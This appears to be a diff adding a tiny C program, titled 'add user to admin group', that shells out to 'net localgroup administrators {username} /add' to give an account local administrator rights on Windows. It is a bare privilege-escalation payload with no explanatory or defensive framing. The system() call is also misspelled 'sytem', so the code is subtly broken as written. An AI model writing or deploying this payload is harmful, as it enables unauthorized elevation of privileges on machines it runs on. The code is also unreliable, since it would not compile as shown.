@@ -1,0 +1,11 @@
+=============add user to admin group==============
+
+#include <stdlib.h>
+int main ()
+{
+int i;
+i=sytem ("net localgroup administrators {username} /add");
+return 0;
+}
+
+##########################################
